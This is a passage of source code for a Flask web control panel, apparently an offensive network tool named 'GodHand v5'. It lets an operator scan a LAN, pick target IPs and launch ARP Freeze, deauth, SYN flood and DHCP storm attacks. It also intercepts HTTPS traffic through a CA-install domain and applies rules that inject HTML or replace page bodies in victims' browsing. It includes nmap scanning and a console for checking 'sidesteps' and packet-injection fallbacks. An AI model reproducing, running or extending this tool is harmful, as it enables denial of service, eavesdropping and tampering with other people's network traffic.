      addLog('error', 'Failed to stop HTTPS interception: ' + (data.error || 'unknown error'));
    }
  } catch (e) {
    addLog('error', 'HTTPS stop failed: ' + e.message);
  }
}

function startHttpsStreamListener() {
  // Connect to Server-Sent Events stream for live traffic
  if (httpsEventSource) {
    httpsEventSource.close();
  }

  httpsEventSource = new EventSource('/api/https_traffic/stream?foo=' + Math.random(), {
    headers: { 'Authorization': 'Bearer ' + authToken }
  });

  httpsEventSource.addEventListener('message', (event) => {
    try {
      const entry = JSON.parse(event.data);
      if (!entry.error) {
        httpsTrafficEntries.unshift(entry);
        // Keep only last 500 entries in memory
        if (httpsTrafficEntries.length > 500) {
          httpsTrafficEntries.pop();
        }
        updateHttpsTrafficTable();
      }
    } catch (e) {
      console.error('Failed to parse HTTPS traffic entry:', e);
    }
  });

  httpsEventSource.addEventListener('error', (event) => {
    console.error('HTTPS stream error:', event);
    httpsEventSource.close();
  });
}

function updateHttpsTrafficTable() {
  const tbody = document.getElementById('https-traffic-tbody');
  const emptyMsg = document.getElementById('https-traffic-empty');

  if (httpsTrafficEntries.length === 0) {
    tbody.innerHTML = '';
    emptyMsg.style.display = 'block';
    return;
  }

  emptyMsg.style.display = 'none';
  tbody.innerHTML = httpsTrafficEntries.map(entry => {
    const timestamp = new Date(entry.timestamp).toLocaleTimeString();
    const method = entry.method || entry.status || '—';
    const icon = entry.type === 'request' ? '→' : '←';

    return `
      <tr style="border-bottom:1px solid rgba(255,255,255,0.05); hover:{background:rgba(255,255,255,0.05);}">
        <td style="padding:6px; font-size:0.8rem;">${timestamp}</td>
        <td style="padding:6px;">${icon} ${entry.type}</td>
        <td style="padding:6px; word-break:break-all;">${entry.hostname}</td>
        <td style="padding:6px; color:#80B9E8;">${method}</td>
        <td style="padding:6px; font-family:monospace;">${entry.client_ip}</td>
      </tr>
    `;
  }).slice(0, 100).join('');
}

async function httpsFilterTraffic() {
  const filter = document.getElementById('https-filter').value.toLowerCase();
  if (!filter) {
    updateHttpsTrafficTable();
    return;
  }

  // Filter in-memory entries
  const filtered = httpsTrafficEntries.filter(e =>
    e.hostname.toLowerCase().includes(filter)
  );

  const tbody = document.getElementById('https-traffic-tbody');
  tbody.innerHTML = filtered.map(entry => {
    const timestamp = new Date(entry.timestamp).toLocaleTimeString();
    const method = entry.method || entry.status || '—';
    const icon = entry.type === 'request' ? '→' : '←';

    return `
      <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
        <td style="padding:6px; font-size:0.8rem;">${timestamp}</td>
        <td style="padding:6px;">${icon} ${entry.type}</td>
        <td style="padding:6px; word-break:break-all;">${entry.hostname}</td>
        <td style="padding:6px; color:#80B9E8;">${method}</td>
        <td style="padding:6px; font-family:monospace;">${entry.client_ip}</td>
      </tr>
    `;
  }).join('');
}

// ========== Developer Console Commands (F12) ==========
// Usage: godDev.testAllModes()  or  godDev.verifySidesteps()
window.godDev = {
  async testAllModes() {
    console.log('%c=== GodHand Developer Console: Testing All 5 Deauth Modes ===', 'color: #54B4EC; font-weight: bold; font-size: 14px;');
    try {
      const res = await apiCall('dev_console', 'POST', {command: 'test_all_modes'});
      if (res.success) {
        console.log('%cMode: ' + res.mode, 'color: #26BBAE; font-weight: bold;');
        console.log('%cInterface Type: ' + res.iface_type, 'color: #80B9E8;');
        console.log('%cModes Tested:', 'color: #54B4EC; font-weight: bold;');
        console.table(res.modes_tested);
        res.results.forEach(r => console.log('%c' + r, 'color: #26BBAE;'));
      } else {
        console.error('%cTest failed: ' + (res.error || 'unknown error'), 'color: #942329;');
      }
    } catch(e) {
      console.error('%cDeveloper console error:', 'color: #942329;', e);
    }
  },

  async verifySidesteps() {
    console.log('%c=== Verifying Sidesteps/Workarounds ===', 'color: #54B4EC; font-weight: bold; font-size: 14px;');
    try {
      const res = await apiCall('dev_console', 'POST', {command: 'verify_sidesteps'});
      if (res.success) {
        res.results.forEach(r => console.log('%c' + r, 'color: #26BBAE;'));
        console.log('%cAll sidesteps verified and functional ✓', 'color: #26BBAE; font-weight: bold;');
      } else {
        console.error('%cSidesteп verification failed: ' + (res.error || 'unknown error'), 'color: #942329;');
      }
    } catch(e) {
      console.error('%cDeveloper console error:', 'color: #942329;', e);
    }
  },

  async testSocketProxy() {
    console.log('%c=== Testing Custom Socket Proxy Layer ===', 'color: #54B4EC; font-weight: bold; font-size: 14px;');
    try {
      const res = await apiCall('dev_console', 'POST', {command: 'test_socket_proxy'});
      if (res.success) {
        console.log('%cInjection Methods:', 'color: #54B4EC; font-weight: bold;');
        res.results.forEach(r => {
          const color = r.startsWith('→') ? '#54B4EC' : r.startsWith('✓') ? '#26BBAE' : '#942329';
          console.log('%c' + r, `color: ${color};`);
        });
        console.table({
          'AF_PACKET': res.af_packet,
          'AF_INET (raw IP)': res.af_inet,
          'SOCKS Proxy': res.socks_proxy,
          'Recommended': res.recommended_method
        });
      } else {
        console.error('%cSocket proxy test failed: ' + (res.error || 'unknown error'), 'color: #942329;');
      }
    } catch(e) {
      console.error('%cDeveloper console error:', 'color: #942329;', e);
    }
  },

  async getLogs() {
    console.log('%c=== Developer Logs ===', 'color: #54B4EC; font-weight: bold; font-size: 14px;');
    try {
      const res = await apiCall('dev_console', 'POST', {command: 'logs'});
      if (res.success && res.logs.length > 0) {
        res.logs.forEach(log => {
          const time = new Date(log.timestamp).toLocaleTimeString();
          const style = log.level === 'error' ? 'color: #942329; font-weight: bold;' : 'color: #80B9E8;';
          console.log('%c[' + time + '] ' + log.message, style);
        });
      } else {
        console.log('%cNo developer logs yet', 'color: #80B9E8;');
      }
    } catch(e) {
      console.error('%cFailed to fetch logs:', 'color: #942329;', e);
    }
  },

  help() {
    console.log('%c╔════════════════════════════════════════════════════╗', 'color: #54B4EC;');
    console.log('%c║       GodHand Developer Console                   ║', 'color: #54B4EC;');
    console.log('%c╚════════════════════════════════════════════════════╝', 'color: #54B4EC;');
    console.log('%cAvailable Commands:', 'color: #54B4EC; font-weight: bold;');
    console.log('%c  godDev.testAllModes()      - Test all 5 deauth capability modes', 'color: #80B9E8;');
    console.log('%c  godDev.verifySidesteps()   - Verify all workarounds are in place', 'color: #80B9E8;');
    console.log('%c  godDev.testSocketProxy()   - Test packet injection fallback chain', 'color: #80B9E8;');
    console.log('%c  godDev.getLogs()           - Show developer logs', 'color: #80B9E8;');
    console.log('%c  godDev.help()              - Show this help', 'color: #80B9E8;');
  }
};

// Print dev console banner
console.log('%c╔════════════════════════════════════════════════════╗', 'color: #54B4EC; font-size: 12px;');
console.log('%c║  GodHand v5 Developer Console Active             ║', 'color: #54B4EC; font-size: 12px;');
console.log('%c║  Type: godDev.help()  for commands                ║', 'color: #54B4EC; font-size: 12px;');
console.log('%c╚════════════════════════════════════════════════════╝', 'color: #54B4EC; font-size: 12px;');

// HTTPS tab functions
async function createInjectionRule() {
  const hostname = document.getElementById('rule-hostname').value.trim();
  const action = document.getElementById('rule-action').value;
  const value = document.getElementById('rule-value').value.trim();

  if (!hostname || !value) {
    showToast('Hostname pattern and value required', 'error');
    return;
  }

  try {
    const res = await apiCall('https_injection/rules', 'POST', {
      hostname_pattern: hostname,
      action_type: action,
      action_value: value,
      enabled: true
    });
    if (res.success) {
      showToast('Rule created: ' + res.id, 'success');
      clearRuleForm();
      loadInjectionRules();
    } else {
      showToast('Failed: ' + (res.error || 'unknown error'), 'error');
    }
  } catch(e) {
    showToast('Error: ' + e.message, 'error');
  }
}

function clearRuleForm() {
  document.getElementById('rule-hostname').value = '';
  document.getElementById('rule-action').value = 'add_header';
  document.getElementById('rule-value').value = '';
}

async function loadInjectionRules() {
  try {
    const res = await apiCall('https_injection/rules');
    const container = document.getElementById('rules-container');

    if (!res.rules || res.rules.length === 0) {
      container.innerHTML = '<p style="color:#999; text-align:center;">No injection rules created yet.</p>';
      return;
    }

    let html = '<div style="display:grid; gap:8px;">';
    res.rules.forEach(rule => {
      html += `
        <div style="padding:10px; background:#1a1a1a; border:1px solid #444; border-radius:4px; display:grid; grid-template-columns:1fr auto auto auto; gap:8px; align-items:center;">
          <div>
            <div><strong>${rule.hostname_pattern}</strong> → <code>${rule.action_type}</code></div>
            <div style="color:#999; font-size:0.85rem; margin-top:4px;">${rule.action_value.substring(0, 50)}${rule.action_value.length > 50 ? '...' : ''}</div>
          </div>
          <label style="display:flex; align-items:center; gap:6px; cursor:pointer;">
            <input type="checkbox" ${rule.enabled ? 'checked' : ''} onchange="toggleRuleEnabled('${rule.id}', this.checked)">
            <span style="font-size:0.85rem; color:#999;">Enabled</span>
          </label>
          <button class="btn secondary" onclick="editRuleForm('${rule.id}')" style="min-width:60px; padding:4px 8px; font-size:0.85rem;">Edit</button>
          <button class="btn danger" onclick="deleteInjectionRule('${rule.id}')" style="min-width:60px; padding:4px 8px; font-size:0.85rem;">Delete</button>
        </div>
      `;
    });
    html += '</div>';
    container.innerHTML = html;
  } catch(e) {
    document.getElementById('rules-container').innerHTML = '<p style="color:#c44; text-align:center;">Error loading rules: ' + e.message + '</p>';
  }
}

async function toggleRuleEnabled(ruleId, enabled) {
  try {
    const res = await apiCall('https_injection/rules/' + ruleId, 'PUT', { enabled });
    if (res.success) {
      loadInjectionRules();
    }
  } catch(e) {
    showToast('Error: ' + e.message, 'error');
  }
}

async function deleteInjectionRule(ruleId) {
  if (!confirm('Delete this injection rule?')) return;
  try {
    const res = await apiCall('https_injection/rules/' + ruleId, 'DELETE');
    if (res.success) {
      showToast('Rule deleted', 'success');
      loadInjectionRules();
    }
  } catch(e) {
    showToast('Error: ' + e.message, 'error');
  }
}

async function addLanDomain() {
  const domain = document.getElementById('lan-domain-input').value.trim();
  if (!domain) {
    showToast('Domain required', 'error');
    return;
  }
  if (!domain.endsWith('.lan')) {
    showToast('Domain must end with .lan', 'error');
    return;
  }

  try {
    const res = await apiCall('gateway/dns/add_lan_domain', 'POST', { domain });
    if (res.success) {
      showToast('Domain added: ' + domain, 'success');
      document.getElementById('lan-domain-input').value = '';
      loadLanDomains();
    } else {
      showToast('Failed: ' + (res.error || 'unknown'), 'error');
    }
  } catch(e) {
    showToast('Error: ' + e.message, 'error');
  }
}

async function loadLanDomains() {
  try {
    const res = await apiCall('gateway/dns/lan_domains');
    const container = document.getElementById('lan-domains-list');

    if (!res.lan_domains || res.lan_domains.length === 0) {
      container.innerHTML = '<p style="color:#999; text-align:center;">No .lan domains configured.</p>';
      return;
    }

    let html = '<div style="display:grid; gap:6px;">';
    res.lan_domains.forEach(domain => {
      html += `
        <div style="padding:8px 12px; background:#1a1a1a; border:1px solid #444; border-radius:4px; display:flex; justify-content:space-between; align-items:center;">
          <code>${domain}</code>
          <button class="btn danger" onclick="deleteLanDomain('${domain}')" style="padding:4px 8px; font-size:0.85rem;">Remove</button>
        </div>
      `;
    });
    html += '</div>';
    container.innerHTML = html;
  } catch(e) {
    document.getElementById('lan-domains-list').innerHTML = '<p style="color:#c44; text-align:center;">Error loading domains</p>';
  }
}

async function deleteLanDomain(domain) {
  if (!confirm('Remove ' + domain + '?')) return;
  try {
    const res = await apiCall('gateway/dns/remove_lan_domain', 'POST', { domain });
    if (res.success) {
      showToast('Domain removed', 'success');
      loadLanDomains();
    }
  } catch(e) {
    showToast('Error: ' + e.message, 'error');
  }
}

async function updateHttpsTraffic() {
  try {
    const res = await apiCall('https_traffic?limit=50');
    const tbody = document.getElementById('https-traffic-body');

    if (!res.traffic || res.traffic.length === 0) {
      tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#999;">No traffic captured</td></tr>';
      return;
    }

    let html = '';
    res.traffic.slice(0, 20).forEach(entry => {
      const ts = new Date(entry.timestamp * 1000).toLocaleTimeString();
      html += `<tr><td>${ts}</td><td>${entry.hostname || '—'}</td><td>${entry.method || '—'}</td><td>${entry.path || '—'}</td><td>${entry.status_code || '—'}</td><td>${formatBytes(entry.bytes || 0)}</td></tr>`;
    });
    tbody.innerHTML = html;
  } catch(e) {}
}

function formatBytes(bytes) {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return Math.round((bytes / Math.pow(k, i)) * 10) / 10 + ' ' + sizes[i];
}

// Initialize HTTPS tab when tab is shown
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    if (btn.dataset.tab === 'https') {
      setTimeout(() => {
        loadInjectionRules();
        loadLanDomains();
        updateHttpsTraffic();
        setInterval(updateHttpsTraffic, 2000);
      }, 100);
    }
  });
});

checkLoginRequired();
</script>
</body>
</html>
'''
    return render_template_string(html_template)

# ---------- API endpoints (with authentication) ----------
@app.route('/api/interfaces', methods=['GET'])
@require_auth
def api_interfaces():
    try:
        out = subprocess.check_output(['ip', '-o', 'link', 'show'], text=True)
        iface_list = []
        for line in out.splitlines():
            parts = line.split(':')
            if len(parts) >= 2:
                name = parts[1].strip()
                if name == 'lo':
                    continue
                ip = ''
                try:
                    ip_out = subprocess.check_output(['ip', '-o', '-4', 'addr', 'show', name], text=True)
                    for l in ip_out.splitlines():
                        if 'inet ' in l:
                            ip = l.split()[3].split('/')[0]
                            break
                except:
                    pass
                wireless = False
                try:
                    subprocess.check_output(['iw', 'dev', name, 'info'], stderr=subprocess.DEVNULL, text=True)
                    wireless = True
                except:
                    pass
                iface_list.append({'name': name, 'ip': ip, 'wireless': wireless})
        return jsonify({'interfaces': iface_list})
    except Exception as e:
        return jsonify({'interfaces': [], 'error': str(e)})

@app.route('/api/set_interface', methods=['POST'])
@require_auth
def api_set_interface():
    data = request.json
    iface = data.get('interface')
    if not iface:
        return jsonify({'success': False, 'status': 'No interface provided'})
    update_state('interface', iface)
    add_log('info', f'Interface set to {iface}')
    # Mitigate IPv6 bypass and DoH on interface selection (once-per-session)
    threading.Thread(target=mitigate_ipv6_doh, args=(iface,), daemon=True).start()
    return jsonify({'success': True, 'status': f'Interface set to {iface}'})

@app.route('/api/set_gateway', methods=['POST'])
@require_auth
def api_set_gateway():
    data = request.json
    gw = data.get('gateway')
    if not gw or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', gw):
        return jsonify({'success': False, 'status': 'Invalid IP'})
    update_state('gateway', gw)
    add_log('info', f'Gateway set to {gw}')
    return jsonify({'success': True, 'status': f'Gateway set to {gw}'})

@app.route('/api/set_port', methods=['POST'])
@require_auth
def api_set_port():
    data = request.json
    port = data.get('port')
    try:
        port = int(port)
    except:
        return jsonify({'success': False, 'status': 'Invalid port'})
    if port < 1 or port > 65535:
        return jsonify({'success': False, 'status': 'Invalid port'})
    update_state('port', port)
    add_log('info', f'Port set to {port}')
    return jsonify({'success': True, 'status': f'Port set to {port}'})

@app.route('/api/state', methods=['GET'])
@require_auth
def api_state():
    with STATE_LOCK:
        return jsonify({
            'state': {
                'interface': STATE['interface'],
                'gateway': STATE['gateway'],
                'port': STATE['port'],
                'targets': STATE['targets'],
                'hosts': STATE['hosts'],
                'blocked_macs': list(STATE['blocked_macs']),
            },
            'running_attacks': list(STATE['attack_pids'].keys()),
            'auth_enabled': bool(SECRET or LOGIN_PASSWORD),
            'is_root': os.geteuid() == 0,
        })

@app.route('/api/scan', methods=['GET'])
@require_auth
def api_scan():
    iface = get_state('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'Interface not set'})
    my_ip, cidr = get_my_ip_and_cidr(iface)
    if my_ip == '0.0.0.0':
        return jsonify({'success': False, 'error': 'No IP on interface'})
    hosts = arp_scan(iface, my_ip, cidr)
    update_state('hosts', hosts)
    add_log('info', f'ARP scan completed, found {len(hosts)} hosts')
    return jsonify({'success': True, 'hosts': hosts})

@app.route('/api/add_target', methods=['POST'])
@require_auth
def api_add_target():
    data = request.json
    ip = data.get('ip')
    if not ip or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({'success': False, 'error': 'Invalid IP'})
    if ip not in STATE['targets']:
        add_to_list('targets', ip)
        add_log('info', f'Target added: {ip}')
    return jsonify({'success': True})

@app.route('/api/remove_target', methods=['POST'])
@require_auth
def api_remove_target():
    data = request.json
    ip = data.get('ip')
    if ip in STATE['targets']:
        remove_from_list('targets', ip)
        add_log('info', f'Target removed: {ip}')
    return jsonify({'success': True})

@app.route('/api/start_attack', methods=['POST'])
@require_auth
def api_start_attack():
    data = request.json
    weapon = data.get('weapon')
    if weapon not in [1,2,3,4,5]:
        return jsonify({'success': False, 'error': 'Invalid weapon'})
    if not STATE['interface']:
        return jsonify({'success': False, 'error': 'Interface not set'})
    if not STATE['targets']:
        return jsonify({'success': False, 'error': 'No targets added'})
    if weapon != 5 and not STATE['gateway']:
        return jsonify({'success': False, 'error': 'Gateway not set'})
    weapon_names_pre = {1:'ARP Freeze',2:'Deauth Flood',3:'SYN Flood',4:'DHCP Storm',5:'Traffic Capture'}
    if weapon in (1, 2, 3, 4) and not data.get('confirm_risk'):
        risk = assess_attack_risk(weapon, STATE['targets'], STATE['gateway'], STATE['interface'])
        if risk:
            return jsonify({'success': False, 'requires_confirmation': True,
                             'error': f'{risk} Start {weapon_names_pre[weapon]} anyway?'})
    if weapon in STATE['attack_pids']:
        kill_attack(STATE['attack_pids'][weapon])
        del STATE['attack_pids'][weapon]
    try:
        pids = run_attack(weapon, STATE['targets'], STATE['gateway'], STATE['port'], STATE['interface'])
        if not pids:
            raise RuntimeError('Attack launcher returned no processes')
        with STATE_LOCK:
            STATE['attack_pids'][weapon] = pids
            STATE['attack_status'][weapon] = 'running'
        weapon_names = {1:'ARP Freeze',2:'Deauth Flood',3:'SYN Flood',4:'DHCP Storm',5:'Traffic Capture'}
        add_log('success', f'Attack started: {weapon_names[weapon]}')
        def liveness(weapon_id, proc_list):
            """Continuously monitor attack processes and log failures with stderr."""
            time.sleep(2)  # Give processes time to initialize
            while True:
                time.sleep(1)
                for i, p in enumerate(proc_list):
                    if p.poll() is not None:
                        # Process exited unexpectedly
                        stderr = ''
                        if p.stderr:
                            try:
                                stderr = p.stderr.read().decode(errors='ignore').strip()
                            except:
                                pass
                        error_msg = f'Process {i} exited with code {p.returncode}'
                        if stderr:
                            error_msg += f': {stderr}'
                        add_log('error', f'Attack {weapon_names[weapon_id]} process failed: {error_msg}')
                        with STATE_LOCK:
                            STATE['attack_status'][weapon_id] = 'dead'
                        return
        threading.Thread(target=liveness, args=(weapon, pids), daemon=True).start()
        return jsonify({'success': True, 'weapon': weapon_names[weapon]})
    except Exception as e:
        add_log('error', f'Attack start failed: {str(e)}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/start_network_port_monitor', methods=['POST'])
@require_auth
def api_start_network_port_monitor():
    """Start network-wide monitoring of a specific port (all devices on LAN).

    Unlike weapon 5 (target-specific traffic capture), this monitors the entire
    network for ANY device using the specified port.

    Request JSON:
      - port: Port number to monitor (1-65535)
      - iface: Network interface (auto-filled from current)

    Returns: {success, message, port, duration_seconds}
    """
    data = request.json
    port = data.get('port')

    if not port or not isinstance(port, int) or port < 1 or port > 65535:
        return jsonify({'success': False, 'error': 'Invalid port (must be 1-65535)'})

    if not STATE['interface']:
        return jsonify({'success': False, 'error': 'Interface not set'})

    try:
        # Stop any existing port monitor
        if 'port_monitor_pid' in STATE:
            try:
                os.kill(STATE['port_monitor_pid'], 9)
            except:
                pass

        # Start new network port monitor
        proc = start_network_port_monitor(port, STATE['interface'])
        STATE['port_monitor_pid'] = proc.pid
        STATE['port_monitor_port'] = port

        add_log('success', f'Network Port Monitor started on port {port}')
        return jsonify({
            'success': True,
            'message': f'Monitoring all network traffic on port {port}',
            'port': port,
            'interface': STATE['interface'],
            'pid': proc.pid
        })
    except Exception as e:
        add_log('error', f'Network port monitor failed: {str(e)}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stop_network_port_monitor', methods=['POST'])
@require_auth
def api_stop_network_port_monitor():
    """Stop network-wide port monitoring."""
    try:
        if 'port_monitor_pid' in STATE:
            try:
                os.kill(STATE['port_monitor_pid'], 9)
            except:
                pass
            del STATE['port_monitor_pid']

        if 'port_monitor_port' in STATE:
            port = STATE['port_monitor_port']
            del STATE['port_monitor_port']
            add_log('info', f'Network port monitor on port {port} stopped')
        else:
            add_log('info', 'Network port monitor stopped')

        return jsonify({'success': True, 'message': 'Network port monitor stopped'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

def _terminate_attacks_async(attack_pids_copy, interface_to_reset_val):
    """Terminate all attack processes asynchronously (runs in daemon thread)."""
    try:
        for weapon, pids in attack_pids_copy.items():
            add_log('dev', f'Terminating {len(pids)} process(es) for weapon {weapon}')
            try:
                kill_attack(pids)
                add_log('dev', f'Weapon {weapon} terminated successfully')
            except Exception as e:
                add_log('error', f'Failed to terminate weapon {weapon}: {e}')

        # Reset monitor mode if needed
        if interface_to_reset_val:
            try:
                set_monitor(interface_to_reset_val, False)
                with STATE_LOCK:
                    update_state('monitor_mode_active', False)
                add_log('dev', f'Monitor mode reset on {interface_to_reset_val}')
            except Exception as e:
                add_log('warn', f'Failed to reset monitor mode: {e}')

        # Cleanup: clear attack state
        with STATE_LOCK:
            STATE['attack_pids'] = {}
            STATE['attack_status'] = {}
            if STATE['monitor_log_path']:
                try:
                    os.unlink(STATE['monitor_log_path'])
                except:
                    pass
                STATE['monitor_log_path'] = None

        add_log('info', 'All attacks stopped and cleaned up')
    except Exception as e:
        add_log('error', f'Fatal error in attack termination thread: {e}')

@app.route('/api/stop_attack', methods=['POST'])
@require_auth
def api_stop_attack():
    try:
        interface_to_reset = None

        # Take a snapshot of current processes to terminate (non-blocking read)
        with STATE_LOCK:
            attack_pids_copy = {w: list(pids) for w, pids in STATE['attack_pids'].items()}
            if STATE['interface'] and get_state('monitor_mode_active'):
                interface_to_reset = STATE['interface']

        # Return immediately if no attacks running
        if not attack_pids_copy or not any(attack_pids_copy.values()):
            return jsonify({'success': True, 'status': 'No attacks running'})

        # Spawn daemon thread to terminate processes asynchronously (non-blocking)
        termination_thread = threading.Thread(
            target=_terminate_attacks_async,
            args=(attack_pids_copy, interface_to_reset),
            daemon=True
        )
        termination_thread.start()

        # Return immediately to prevent UI freeze
        add_log('info', 'Stop attack requested, termination in progress (async)')
        return jsonify({'success': True, 'status': 'Attack termination in progress'})
    except Exception as e:
        add_log('error', f'Error stopping attack: {e}')
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/attack_status', methods=['GET'])
@require_auth
def api_attack_status():
    with STATE_LOCK:
        for weapon, pids in STATE['attack_pids'].items():
            if any(p.poll() is not None for p in pids):
                STATE['attack_status'][weapon] = 'dead'
            else:
                STATE['attack_status'][weapon] = 'running'
        attacks = {weapon: (STATE['attack_status'].get(weapon) == 'running') for weapon in STATE['attack_pids']}
    return jsonify({'attacks': attacks})

@app.route('/api/monitor_log', methods=['GET'])
@require_auth
def api_monitor_log():
    entries = STATE.get('monitor_entries', [])
    return jsonify({'entries': entries[-150:], 'capturing': 5 in STATE['attack_pids']})

@app.route('/api/traffic_stats', methods=['GET'])
@require_auth
def api_traffic_stats():
    stats = compute_traffic_stats()
    stats['capturing'] = 5 in STATE['attack_pids']
    return jsonify({'success': True, **stats})

@app.route('/api/tcp_streams', methods=['GET'])
@require_auth
def api_tcp_streams():
    return jsonify({'success': True, 'streams': reassemble_tcp_streams()})

@app.route('/api/nmap_scan', methods=['GET'])
@require_auth
def api_nmap_scan():
    ip = request.args.get('ip', '')
    full = request.args.get('full', '0') == '1'
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({'success': False, 'error': 'Invalid IP'})
    add_log('info', f'Starting nmap {"full" if full else "quick"} scan on {ip}')
    try:
        ports = run_nmap_scan(ip, full=full)
        add_log('success', f'Nmap scan on {ip} complete: {len(ports)} open port(s)')
        return jsonify({'success': True, 'ip': ip, 'ports': ports})
    except Exception as e:
        add_log('error', f'Nmap scan failed on {ip}: {str(e)}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/bandwidth', methods=['GET'])
@require_auth
def api_bandwidth():
    iface = get_state('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'Interface not set'})
    counters = get_iface_bytes(iface)
    if counters is None:
        return jsonify({'success': False, 'error': f'No stats available for {iface}'})
    rx_bytes, tx_bytes = counters
    now = time.time()
    with STATE_LOCK:
        prev = STATE.get('bandwidth_sample')
        STATE['bandwidth_sample'] = {'iface': iface, 'time': now, 'rx': rx_bytes, 'tx': tx_bytes}
    if not prev or prev['iface'] != iface or now <= prev['time']:
        return jsonify({'success': True, 'iface': iface, 'rx_bps': 0, 'tx_bps': 0, 'rx_total': rx_bytes, 'tx_total': tx_bytes})
    dt = now - prev['time']
    rx_bps = max(0, (rx_bytes - prev['rx']) / dt)
    tx_bps = max(0, (tx_bytes - prev['tx']) / dt)
    return jsonify({'success': True, 'iface': iface, 'rx_bps': rx_bps, 'tx_bps': tx_bps, 'rx_total': rx_bytes, 'tx_total': tx_bytes})

@app.route('/api/gateway/status', methods=['GET'])
@require_auth
def api_gateway_status():
    return jsonify({
        'success': True,
        'local_ip': get_local_ip(),
        'external_ip': get_external_ip(),
        'dns': gateway_dns_status(),
        'vpn': gateway_vpn_status(),
        'proxy': gateway_proxy_status(),
    })

@app.route('/api/gateway/dns/start', methods=['POST'])
@require_auth
def api_gateway_dns_start():
    try:
        start_gateway_dns()
        return jsonify({'success': True, 'status': 'DNS privacy stack started'})
    except Exception as e:
        add_log('error', f'Gateway DNS start failed: {e}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/gateway/dns/stop', methods=['POST'])
@require_auth
def api_gateway_dns_stop():
    stop_gateway_dns()
    return jsonify({'success': True, 'status': 'DNS privacy stack stopped'})

@app.route('/api/gateway/dns/update_blocklist', methods=['POST'])
@require_auth
def api_gateway_update_blocklist():
    add_log('info', 'Updating gateway blocklist...')
    domains = fetch_blocklist_domains()
    write_gateway_configs(domains)
    add_log('success', f'Blocklist updated: {len(domains)} domains')
    return jsonify({'success': True, 'count': len(domains)})

@app.route('/api/gateway/dns/test', methods=['GET'])
@require_auth
def api_gateway_dns_test():
    return jsonify({'success': True, 'results': test_gateway_dns()})

@app.route('/api/gateway/dns/lan_domains', methods=['GET'])
@require_auth
def api_gateway_list_lan_domains():
    with STATE_LOCK:
        lan_domains = list(STATE.get('lan_domains', ['pac.installCA.lan']))
    return jsonify({'success': True, 'lan_domains': lan_domains})

@app.route('/api/gateway/dns/add_lan_domain', methods=['POST'])
@require_auth
def api_gateway_add_lan_domain():
    data = request.json
    domain = data.get('domain', '').strip()
    if not domain:
        return jsonify({'success': False, 'error': 'Domain required'})
    if not domain.endswith('.lan'):
        return jsonify({'success': False, 'error': 'Domain must end with .lan'})

    with STATE_LOCK:
        if domain not in STATE['lan_domains']:
            STATE['lan_domains'].append(domain)
        lan_domains = list(STATE['lan_domains'])

    # Regenerate gateway configs with new domains
    try:
        write_gateway_configs(list(DEFAULT_BLOCKED_DOMAINS), lan_domains=lan_domains)
        add_log('info', f'Added .lan domain: {domain}')
        return jsonify({'success': True, 'lan_domains': lan_domains})
    except Exception as e:
        add_log('error', f'Failed to add .lan domain: {e}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/gateway/dns/remove_lan_domain', methods=['POST'])
@require_auth
def api_gateway_remove_lan_domain():
    data = request.json
    domain = data.get('domain', '').strip()
    if not domain:
        return jsonify({'success': False, 'error': 'Domain required'})

    with STATE_LOCK:
        if domain in STATE['lan_domains']:
            STATE['lan_domains'].remove(domain)
        lan_domains = list(STATE['lan_domains'])

    # Regenerate gateway configs without the removed domain
    try:
        write_gateway_configs(list(DEFAULT_BLOCKED_DOMAINS), lan_domains=lan_domains)
        add_log('info', f'Removed .lan domain: {domain}')
        return jsonify({'success': True, 'lan_domains': lan_domains})
    except Exception as e:
        add_log('error', f'Failed to remove .lan domain: {e}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/https_injection/rules', methods=['GET'])
@require_auth
def api_injection_list_rules():
    with STATE_LOCK:
        rules = [dict(r) for r in STATE.get('injection_rules', [])]
    return jsonify({'success': True, 'rules': rules})

@app.route('/api/https_injection/rules', methods=['POST'])
@require_auth
def api_injection_create_rule():
    data = request.json
    rule_id = str(uuid.uuid4())[:8]
    rule = {
        'id': rule_id,
        'enabled': data.get('enabled', True),
        'hostname_pattern': data.get('hostname_pattern', ''),
        'action_type': data.get('action_type', ''),  # 'add_header', 'remove_header', 'replace_body', 'inject_html'
        'action_value': data.get('action_value', ''),
        'description': data.get('description', ''),
        'created_at': time.time()
    }

    if not rule['hostname_pattern']:
        return jsonify({'success': False, 'error': 'hostname_pattern required'})
    if not rule['action_type'] or rule['action_type'] not in ['add_header', 'remove_header', 'replace_body', 'inject_html']:
        return jsonify({'success': False, 'error': 'action_type must be: add_header, remove_header, replace_body, or inject_html'})

    with STATE_LOCK:
        STATE['injection_rules'].append(rule)

    add_log('info', f'Created injection rule: {rule_id} ({rule["action_type"]})')
    return jsonify({'success': True, 'rule': rule})

@app.route('/api/https_injection/rules/<rule_id>', methods=['GET'])
@require_auth
def api_injection_get_rule(rule_id):
    with STATE_LOCK:
        rule = next((r for r in STATE.get('injection_rules', []) if r['id'] == rule_id), None)

    if not rule:
        return jsonify({'success': False, 'error': 'Rule not found'})

    return jsonify({'success': True, 'rule': rule})

@app.route('/api/https_injection/rules/<rule_id>', methods=['PUT'])
@require_auth
def api_injection_update_rule(rule_id):
    data = request.json

    with STATE_LOCK:
        rule = next((r for r in STATE.get('injection_rules', []) if r['id'] == rule_id), None)
        if not rule:
            return jsonify({'success': False, 'error': 'Rule not found'})

        # Update allowed fields
        if 'enabled' in data:
            rule['enabled'] = data['enabled']
        if 'hostname_pattern' in data:
